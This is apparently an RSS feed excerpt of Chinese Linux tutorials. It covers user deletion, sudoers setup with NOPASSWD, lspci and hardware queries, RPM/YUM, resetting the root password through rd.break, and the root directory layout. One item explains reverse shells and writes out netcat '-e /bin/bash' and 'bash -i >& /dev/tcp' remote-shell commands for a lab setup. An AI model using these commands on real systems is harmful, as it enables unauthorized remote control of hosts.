<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3> userdel</h3>
<p><code>userdel</code> 用于删除已有的用户。语法格式：<code>userdel [选项] 用户名</code></p>
<blockquote>
<p>默认保留用户家目录</p>
</blockquote>
<table>
<thead>
<tr>
<th style="text-align:center">选项</th>
<th style="text-align:left">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>-f</code></td>
<td style="text-align:left">强制删除用户</td>
</tr>
<tr>
<td style="text-align:center"><code>-r</code></td>
<td style="text-align:left">同时删除用户及用户家目录</td>
</tr>
</tbody>
</table>
<p>example：</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>使用 sudo 时报错</title>
      <link>https://sankgao.github.io/computers/linux/error_using_sudo.html</link>
      <guid>https://sankgao.github.io/computers/linux/error_using_sudo.html</guid>
      <source url="https://sankgao.github.io/rss.xml">使用 sudo 时报错</source>
      <description>普通用户使用 sudo 时报错 Linux 普通用户执行 sudo 命令时，提示：sudo: no tty present and no askpass program specified，原因是默认新建的用户不在 sudo 组，没有开启免密，需要编辑 /etc/sudoers 文件将用户或用户组加入。 解决方法： 切换到 root 用户，执行命令 v...</description>
      <category>Computer</category>
      <pubDate>Wed, 12 Apr 2023 00:00:00 GMT</pubDate>
      <content:encoded><![CDATA[<h2> 普通用户使用 sudo 时报错</h2>
<p>Linux 普通用户执行 <code>sudo</code> 命令时，提示：<code>sudo: no tty present and no askpass program specified</code>，原因是默认新建的用户不在 <code>sudo</code> 组，没有开启免密，需要编辑 <code>/etc/sudoers</code> 文件将用户或用户组加入。</p>
<p><strong>解决方法：</strong></p>
<p>切换到 root 用户，执行命令 <code>visudo</code> 或者 <code>vim /etc/sudoers</code>，打开 <code>sudoers</code> 文件，在最下面一行添加以下内容：</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>再输入 <code>:wq!</code> 保存</p>
<h2> sudoers</h2>
<p><code>sudoers</code> 文件是用于指定特定用户或用户组像 root 用户一样使用各种各样的命令，而不需要输入 root 用户密码，语法格式：<code>user    MACHINE=COMMANDS</code> （用户 主机地址=（可以变换的身份） 可以执行的命令）。</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><ul>
<li><strong>第一段</strong>：用户名或者用户组，表示谁有权限来使用后面的配置。<code>%sudo</code> 代表 sudo 组下的所有用户</li>
<li><strong>第二段</strong>：表示来源地，即从哪执行这条命令。<code>ALL</code> 表示所有计算机</li>
<li><strong>第三段</strong>：表示 sudo 可以切换到什么用户。<code>ALL</code> 表示所有用户</li>
<li><strong>第四段</strong>：表示 sudo 可以切换到哪些组下的用户。<code>ALL</code> 表示所有组</li>
<li><strong>第五段</strong>：表示 sudo 之后能够执行的命令。<code>NOPASSWD:ALL</code> 表示执行任意命令都不需要输入用户密码</li>
</ul>
]]></content:encoded>
    </item>
    <item>
      <title>硬件资源管理</title>
      <link>https://sankgao.github.io/computers/linux/hardware_resource.html</link>
      <guid>https://sankgao.github.io/computers/linux/hardware_resource.html</guid>
      <source url="https://sankgao.github.io/rss.xml">硬件资源管理</source>
      <description>查看系统 PCI 设备 lspci 用于列出所有的 PCI 设备，比如主板、声卡、显卡和网卡等，也会把 USB 接口设备显示出来。语法格式：lspci [参数] 基本显示模式： 参数 作用 :----: :---- -mm 生成机器可读输出（单个 -m 表示过时的格式） -t 显示总线树 显示选项： 参数 作用 :----: :---- -v 冗余（-...</description>
      <category>Computer</category>
      <pubDate>Wed, 12 Apr 2023 00:00:00 GMT</pubDate>
      <content:encoded><![CDATA[<h2> 查看系统 PCI 设备</h2>
<p><code>lspci</code> 用于列出所有的 PCI 设备，比如主板、声卡、显卡和网卡等，也会把 USB 接口设备显示出来。语法格式：<code>lspci [参数]</code></p>
<p>基本显示模式：</p>
<table>
<thead>
<tr>
<th style="text-align:center">参数</th>
<th style="text-align:left">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>-mm</code></td>
<td style="text-align:left">生成机器可读输出（单个 <code>-m</code> 表示过时的格式）</td>
</tr>
<tr>
<td style="text-align:center"><code>-t</code></td>
<td style="text-align:left">显示总线树</td>
</tr>
</tbody>
</table>
<p>显示选项：</p>
<table>
<thead>
<tr>
<th style="text-align:center">参数</th>
<th style="text-align:left">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>-v</code></td>
<td style="text-align:left">冗余（-vv 或 -vvv 用于更高的冗余度）</td>
</tr>
<tr>
<td style="text-align:center"><code>-k</code></td>
<td style="text-align:left">显示处理每个设备的内核驱动程序</td>
</tr>
<tr>
<td style="text-align:center"><code>-x</code></td>
<td style="text-align:left">显示配置空间标准部分的十六进制转储</td>
</tr>
<tr>
<td style="text-align:center"><code>-xxx</code></td>
<td style="text-align:left">显示整个配置空间的十六进制转储（危险；仅限 root）</td>
</tr>
<tr>
<td style="text-align:center"><code>-xxxx</code></td>
<td style="text-align:left">显示 4096 字节扩展配置空间的十六进制转储（仅限 root）</td>
</tr>
<tr>
<td style="text-align:center"><code>-b</code></td>
<td style="text-align:left">总线中心视图（总线看到的地址和 IRQ）</td>
</tr>
<tr>
<td style="text-align:center"><code>-D</code></td>
<td style="text-align:left">始终显示域名</td>
</tr>
<tr>
<td style="text-align:center"><code>-P</code></td>
<td style="text-align:left">除显示总线和设备编号外，还显示网桥路径</td>
</tr>
<tr>
<td style="text-align:center"><code>-PP</code></td>
<td style="text-align:left">除显示总线和设备编号外，还显示总线路径</td>
</tr>
</tbody>
</table>
<p>将设备 ID 解析为名称：</p>
<table>
<thead>
<tr>
<th style="text-align:center">参数</th>
<th style="text-align:left">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>-n</code></td>
<td style="text-align:left">显示数字 ID</td>
</tr>
<tr>
<td style="text-align:center"><code>-nn</code></td>
<td style="text-align:left">显示文本和数字 ID（名称和数字）</td>
</tr>
<tr>
<td style="text-align:center"><code>-q</code></td>
<td style="text-align:left">通过 DNS 查询 PCI ID 数据库中的未知 ID</td>
</tr>
<tr>
<td style="text-align:center"><code>-qq</code></td>
<td style="text-align:left">同上，但重新查询本地缓存的条目</td>
</tr>
<tr>
<td style="text-align:center"><code>-Q</code></td>
<td style="text-align:left">通过 DNS 查询 PCI ID 数据库中的所有 ID</td>
</tr>
</tbody>
</table>
<p>设备选择：</p>
<table>
<thead>
<tr>
<th style="text-align:center">参数</th>
<th style="text-align:left">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>-s[[[[&lt;domain&gt;]：]&lt;bus&gt;]：][&lt;slot&gt;][.[&lt;func&gt;]]</code></td>
<td style="text-align:left">仅显示选定插槽中的设备</td>
</tr>
<tr>
<td style="text-align:center"><code>-d[&lt;vendor&gt;]：[&lt;device&gt;][：&lt;class&gt;]</code></td>
<td style="text-align:left">仅显示具有指定 ID 的设备</td>
</tr>
</tbody>
</table>
<p>其他选项：</p>
<table>
<thead>
<tr>
<th style="text-align:center">参数</th>
<th style="text-align:left">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>-i&lt;file&gt;</code></td>
<td style="text-align:left">使用指定的 ID 数据库，而不是 <code>/usr/share/hwdata/pci.ids</code></td>
</tr>
<tr>
<td style="text-align:center"><code>-p&lt;file&gt;</code></td>
<td style="text-align:left">在给定文件中查找内核模块，而不是默认 <code>mode.pcimap</code></td>
</tr>
<tr>
<td style="text-align:center"><code>-M</code></td>
<td style="text-align:left">启用 “总线映射” 模式（危险；仅限 root）</td>
</tr>
</tbody>
</table>
<p>PCI 访问选项：</p>
<table>
<thead>
<tr>
<th style="text-align:center">参数</th>
<th style="text-align:left">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>-A&lt;method&gt;</code></td>
<td style="text-align:left">使用指定的 PCI 访问方法（有关列表，请参见 <code>-A help</code>）</td>
</tr>
<tr>
<td style="text-align:center"><code>-O&lt;par&gt;=&lt;val&gt;</code></td>
<td style="text-align:left">设置 PCI 访问参数（有关列表，请参见 <code>-O help</code>）</td>
</tr>
<tr>
<td style="text-align:center"><code>-G</code></td>
<td style="text-align:left">启用 PCI 访问调试</td>
</tr>
<tr>
<td style="text-align:center"><code>-H&lt;mode&gt;</code></td>
<td style="text-align:left">使用直接硬件访问（<code>&lt;mode&gt;=1</code> 或 2）</td>
</tr>
<tr>
<td style="text-align:center"><code>-F&lt;file&gt;</code></td>
<td style="text-align:left">从给定文件读取 PCI 配置转储</td>
</tr>
</tbody>
</table>
<p>example：</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2> 查看 CPU 信息</h2>
<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p>在 <code>siblings</code> 和 <code>cpu cores</code> 值之间有个对应关系，如果 <code>siblings</code> 是 <code>cpu cores</code> 的两倍，则说明系统支持超线程，并且超线程已打开；如果 <code>siblings</code> 和 <code>cpu cores</code> 一致，则说明系统不支持超线程，或者超线程未打开</p>
</div>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3> 查看物理 CPU 的个数</h3>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h3> 查看每个物理 CPU 中内核的个数</h3>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h3> 查看系统所有逻辑 CPU 个数</h3>
<p>所有物理 CPU 中内核的个数加上超线程个数</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2> 查看系统内存信息</h2>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2> 查看磁盘分区信息</h2>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>安装软件的方法</title>
      <link>https://sankgao.github.io/computers/linux/install_software.html</link>
      <guid>https://sankgao.github.io/computers/linux/install_software.html</guid>
      <source url="https://sankgao.github.io/rss.xml">安装软件的方法</source>
      <description>RPM 安装 常用的 RPM 命令： 命令 作用 :----: :----: rpm -ivh filename.rpm 安装软件 rpm -Uvh filename.rpm 升级软件 rpm -e filename.rpm 卸载软件 rpm -qpi filename.rpm 查询软件描述信息 rpm -qpl filename.rpm 列出软件文件...</description>
      <category>Computer</category>
      <pubDate>Wed, 12 Apr 2023 00:00:00 GMT</pubDate>
      <content:encoded><![CDATA[<h2> RPM 安装</h2>
<p><strong>常用的 RPM 命令：</strong></p>
<table>
<thead>
<tr>
<th style="text-align:center">命令</th>
<th style="text-align:center">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>rpm -ivh filename.rpm</code></td>
<td style="text-align:center">安装软件</td>
</tr>
<tr>
<td style="text-align:center"><code>rpm -Uvh filename.rpm</code></td>
<td style="text-align:center">升级软件</td>
</tr>
<tr>
<td style="text-align:center"><code>rpm -e filename.rpm</code></td>
<td style="text-align:center">卸载软件</td>
</tr>
<tr>
<td style="text-align:center"><code>rpm -qpi filename.rpm</code></td>
<td style="text-align:center">查询软件描述信息</td>
</tr>
<tr>
<td style="text-align:center"><code>rpm -qpl filename.rpm</code></td>
<td style="text-align:center">列出软件文件信息</td>
</tr>
<tr>
<td style="text-align:center"><code>rpm -qf filename.rpm</code></td>
<td style="text-align:center">查询文件属于哪个 RPM</td>
</tr>
</tbody>
</table>
<h2> YUM 安装</h2>
<p><strong>常用的 YUM 命令：</strong></p>
<table>
<thead>
<tr>
<th style="text-align:center">命令</th>
<th style="text-align:center">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>yum repolist all</code></td>
<td style="text-align:center">列出所有仓库</td>
</tr>
<tr>
<td style="text-align:center"><code>yum list all</code></td>
<td style="text-align:center">列出仓库所有软件包</td>
</tr>
<tr>
<td style="text-align:center"><code>yum info 软件包名称</code></td>
<td style="text-align:center">查看软件包信息</td>
</tr>
<tr>
<td style="text-align:center"><code>yum install 软件包名称</code></td>
<td style="text-align:center">安装软件包</td>
</tr>
<tr>
<td style="text-align:center"><code>yum reinstall 软件包名称</code></td>
<td style="text-align:center">重新安装软件包</td>
</tr>
<tr>
<td style="text-align:center"><code>yum update 软件包名称</code></td>
<td style="text-align:center">升级软件包</td>
</tr>
<tr>
<td style="text-align:center"><code>yum remove 软件包名称</code></td>
<td style="text-align:center">移除软件包</td>
</tr>
<tr>
<td style="text-align:center"><code>yum clean all</code></td>
<td style="text-align:center">清除所有仓库缓存</td>
</tr>
<tr>
<td style="text-align:center"><code>yum check-update</code></td>
<td style="text-align:center">检查可更新的软件包</td>
</tr>
<tr>
<td style="text-align:center"><code>yum grouplist</code></td>
<td style="text-align:center">查看系统中已经安装的软件包</td>
</tr>
<tr>
<td style="text-align:center"><code>yum groupinstall 软件包组</code></td>
<td style="text-align:center">安装指定的软件包组</td>
</tr>
<tr>
<td style="text-align:center"><code>yum groupremove 软件包组</code></td>
<td style="text-align:center">移除指定的软件包组</td>
</tr>
<tr>
<td style="text-align:center"><code>yum groupinfo  软件包组</code></td>
<td style="text-align:center">查询指定的软件包组信息</td>
</tr>
</tbody>
</table>
]]></content:encoded>
    </item>
    <item>
      <title>反弹 Shell</title>
      <link>https://sankgao.github.io/computers/linux/rebound_shell.html</link>
      <guid>https://sankgao.github.io/computers/linux/rebound_shell.html</guid>
      <source url="https://sankgao.github.io/rss.xml">反弹 Shell</source>
      <description>什么是 Shell Shell 就是实现用户命令的接口，通过这个接口我们就能实现对计算机的控制，比如：我们常见的 ssh 就是执行的 Shell 命令实现对远程对服务器的控制。 什么是反弹 Shell 其英文名叫做 Reverse Shell，就是控制端首先监听某个 TCP/UDP 端口，然后被控制端向这个端口发起一个请求，同时将自己命令行的输入输出转...</description>
      <category>Computer</category>
      <pubDate>Wed, 12 Apr 2023 00:00:00 GMT</pubDate>
      <content:encoded><![CDATA[<h2> 什么是 Shell</h2>
<p>Shell 就是实现用户命令的接口，通过这个接口我们就能实现对计算机的控制，比如：我们常见的 ssh 就是执行的 Shell 命令实现对远程对服务器的控制。</p>
<h2> 什么是反弹 Shell</h2>
<p>其英文名叫做 <code>Reverse Shell</code>，就是控制端首先监听某个 <code>TCP/UDP</code> 端口，然后被控制端向这个端口发起一个请求，同时将自己命令行的输入输出转移到控制端，从而控制端就可以输入命令来控制被控端了。</p>
<p>比如说，我们有两台主机 A、B，我们最终想实现在 A 上控制 B。那么如果用正向 Shell，其实就是在 A 上输入 B 的连接地址，比如通过 ssh 连接到 B，连接成功之后，我们就可以在 A 上通过命令控制 B 了。如果用反向 Shell，那就是在 A 上先开启一个监听端口，然后让 B 去连接 A 的这个端口，连接成功之后，A 这边就能通过命令控制 B 了。</p>
<h2> 反弹 Shell 的作用</h2>
<p>当我们使用 A 控制 B，但由于被控端因防火墙受限、权限不足、端口被占用等无法直接连接。这时我们就要使用反弹 Shell 让 B 向 A 主动发起连接，我们就可以使用 A 来控制 B 了。</p>
<h2> 使用方法</h2>
<table>
<thead>
<tr>
<th style="text-align:center">控制端</th>
<th style="text-align:center">被控制端</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">IP：192.168.4.151</td>
<td style="text-align:center">IP：192.168.4.142</td>
</tr>
<tr>
<td style="text-align:center">hostname：root@localhost</td>
<td style="text-align:center">hostname：root@dev_03</td>
</tr>
</tbody>
</table>
<ol>
<li>
<p>控制端和被控制端都安装 nc 命令</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div></li>
<li>
<p>监听端口。在控制端上执行 <code>nc -lvvp 9999</code> 命令</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul>
<li><strong>-l</strong>：监听模式，用于入站连接</li>
<li><strong>-vv</strong>：<code>-vv</code> 比 <code>-v</code> 更详细的输出</li>
<li><strong>-p</strong>：设置本地端口</li>
</ul>
</li>
<li>
<p>发起连接请求。在被控制端上执行 <code>nc -e /bin/bash [控制端的 IP] 9999</code> 命令</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><ul>
<li><strong>-e</strong>：绑定命令行</li>
</ul>
<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p>如果没有 <code>-e</code> 这个参数，是因为 <code>nc</code> 老版本没有这个选项的。需要安装 <code>netcat-traditional</code> 这个包，并执行 <code>update-alternatives --config nc</code> 这个命令，选择 <code>/bin/nc.traditional</code> 的编号，这里选择编号 <code>2</code> 即可</p>
</div>
</li>
<li>
<p>控制端接收连接请求。被控制端发起连接请求后，查看控制端</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li>
<li>
<p>测试。控制端进行测试</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li>
</ol>
<h2> 被控制端使用 bash 发起连接</h2>
<p>被控制端也可以不用安装 nc 这个命令发起连接，可以直接使用 bash 来实现。</p>
<ol>
<li>
<p>监听端口。在控制端上执行 <code>nc -lvvp 9999</code> 命令</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li>
<li>
<p>发起连接请求。在被控制端上执行 <code>bash -i &gt;&amp; /dev/tcp/[控制端的 IP]/9999 0&gt;&amp;1</code> 命令</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><ul>
<li><strong>bash -i</strong>：就是产生一个 bash 交互环境</li>
<li><strong>&gt;&amp;</strong>：可以将 bash 交互环境的输入、输出、错误输出都输出到一个地方</li>
<li><strong>/dev/tcp/[控制端的 IP]/9999</strong>：指的是目标主机的一个连接地址，因为 Linux 环境中所有内容的定义都是以文件的形式存在的，指定这个地址就是让主机和目标主机建立一个 TCP 连接</li>
<li><strong>0&gt;&amp;1</strong>：可以将标准输入和标准输出相结合，重定向给前面标准输出的内容</li>
</ul>
<p>通过这样的命令，我们就可以就是将被控制端的标准输出和错误输出都重定向给控制端，并且将控制端的输入都重定向给被控制端，这样我们就可以实现控制端对被控制端的远程控制了。</p>
</li>
<li>
<p>控制端接收连接请求。被控制端发起连接请求后，查看控制端，会显示被控制端的 localhost</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li>
<li>
<p>测试。控制端进行测试</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li>
</ol>
]]></content:encoded>
    </item>
    <item>
      <title>重置 root 密码</title>
      <link>https://sankgao.github.io/computers/linux/reset_root_password.html</link>
      <guid>https://sankgao.github.io/computers/linux/reset_root_password.html</guid>
      <source url="https://sankgao.github.io/rss.xml">重置 root 密码</source>
      <description>Linux 系统重置 root 密码 1. 重启 Linux 系统主机并出现引导界面时，按下键盘上的 e 键进入内核编辑界面 2. 在 Linux 参数这行的最后面追加 rd.break 参数，然后按下 Ctrl + x 组合键来运行修改过的内核程序 3. 大约 30 秒后，进入到系统的紧急求援模式 4. 依次输入以下命令，再连续按下两次 Ctrl +...</description>
      <category>Computer</category>
      <pubDate>Wed, 12 Apr 2023 00:00:00 GMT</pubDate>
      <content:encoded><![CDATA[<h2> Linux 系统重置 root 密码</h2>
<ol>
<li>
<p>重启 Linux 系统主机并出现引导界面时，按下键盘上的 <code>e</code> 键进入内核编辑界面</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li>
<li>
<p>在 <code>Linux</code> 参数这行的最后面追加 <code>rd.break</code> 参数，然后按下 <code>Ctrl + x</code> 组合键来运行修改过的内核程序</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li>
<li>
<p>大约 30 秒后，进入到系统的紧急求援模式</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div></li>
<li>
<p>依次输入以下命令，再连续按下两次 <code>Ctrl + d</code> 组合键来退出并重启，等待系统再次重启完毕后便可以使用新密码来登录 Linux 系统</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p>重新挂载已经挂载了的文件系统（以读写权限挂载），需要注意的是，挂载点必须是一个已经存在的目录，这个目录可以不为空</p>
</div>
<p><strong>mount -o remount,rw /sysroot</strong>：重新以可读可写的方式挂载 <code>/sysroot</code>
<strong>chroot /sysroot</strong>：改变根目录为 <code>/sysroot</code>
<strong>passwd</strong>：按提示修改 root 密码
<strong>touch /.autorelabel</strong>：查看当前目录下是否有 <strong>.autorelabel</strong> 文件，如果没有必须创建该文件，否则将无法正常启动系统
<strong>exit</strong>：退出
<strong>logout</strong>：重启系统</p>
</li>
</ol>
]]></content:encoded>
    </item>
    <item>
      <title>系统根目录</title>
      <link>https://sankgao.github.io/computers/linux/root_directory.html</link>
      <guid>https://sankgao.github.io/computers/linux/root_directory.html</guid>
      <source url="https://sankgao.github.io/rss.xml">系统根目录</source>
      <description>Linux 系统根目录文件存放内容 在 Linux 系统中，目录、字符设备、套接字、硬盘、光驱、打印机等都会被抽象成了文件形式，即 Linux 系统中一切皆为文件。 路径：分为绝对路径和相对路径 绝对路径：指的是从根目录 / 开始写起文件名称，例如：查找 aaa.txt 文件位置 /home/zhangsan/test/aaa.txt; 相对路径：指的...</description>
      <category>Computer</category>
      <pubDate>Wed, 12 Apr 2023 00:00:00 GMT</pubDate>
      <content:encoded><![CDATA[<h2> Linux 系统根目录文件存放内容</h2>
<p>在 Linux 系统中，目录、字符设备、套接字、硬盘、光驱、打印机等都会被抽象成了文件形式，即 <strong>Linux 系统中一切皆为文件。</strong></p>
<p><strong>路径</strong>：分为绝对路径和相对路径</p>
<ul>
<li><strong>绝对路径</strong>：指的是从根目录 <kbd>/</kbd> 开始写起文件名称，例如：查找 <code>aaa.txt</code> 文件位置 <code>/home/zhangsan/test/aaa.txt</code></li>
<li><strong>相对路径</strong>：指的是从当前目录开始写起文件名称，例如：当前在 <code>/home/zhangsan</code> 目录中，<code>aaa.txt</code> 文件位置就是 <code>test/aaa.txt</code></li>
</ul>
<p>以下目录文件存放的内容为通常放置文件的位置，可以根据自己的情况更改文件位置。</p>
<table>
<thead>
<tr>
<th style="text-align:center">目录名称</th>
<th style="text-align:left">应放置文件的内容</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>/boot</code></td>
<td style="text-align:left">开机所需文件，如：内核文件</td>
</tr>
<tr>
<td style="text-align:center"><code>/dev</code></td>
<td style="text-align:left">设备与接口文件，如：硬盘</td>
</tr>
<tr>
<td style="text-align:center"><code>/etc</code></td>
<td style="text-align:left">软件的配置文件</td>
</tr>
<tr>
<td style="text-align:center"><code>/home</code></td>
<td style="text-align:left">用户家目录文件</td>
</tr>
<tr>
<td style="text-align:center"><code>/bin</code></td>
<td style="text-align:left">系统命令</td>
</tr>
<tr>
<td style="text-align:center"><code>/lib</code></td>
<td style="text-align:left">开机用的函数库</td>
</tr>
<tr>
<td style="text-align:center"><code>/sbin</code></td>
<td style="text-align:left">系统命令</td>
</tr>
<tr>
<td style="text-align:center"><code>/media</code></td>
<td style="text-align:left">挂载设备文件</td>
</tr>
<tr>
<td style="text-align:center"><code>/opt</code></td>
<td style="text-align:left">第三方软件</td>
</tr>
<tr>
<td style="text-align:center"><code>/root</code></td>
<td style="text-align:left">系统管理员家目录</td>
</tr>
<tr>
<td style="text-align:center"><code>/srv</code></td>
<td style="text-align:left">网络服务的数据文件</td>
</tr>
<tr>
<td style="text-align:center"><code>/tmp</code></td>
<td style="text-align:left">“共享” 临时目录</td>
</tr>
<tr>
<td style="text-align:center"><code>/proc</code></td>
<td style="text-align:left">虚拟文件目录</td>
</tr>
<tr>
<td style="text-align:center"><code>/usr/local</code></td>
<td style="text-align:left">用户自行安装的软件</td>
</tr>
<tr>
<td style="text-align:center"><code>/usr/share</code></td>
<td style="text-align:left">帮助说明文件</td>
</tr>
<tr>
<td style="text-align:center"><code>/var</code></td>
<td style="text-align:left">经常变化的文件，如：日志</td>
</tr>
<tr>
<td style="text-align:center"><code>/lost+found</code></td>
<td style="text-align:left">文件系统发生错误，存放一些丢失的文件片段</td>
</tr>
</tbody>
</table>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div 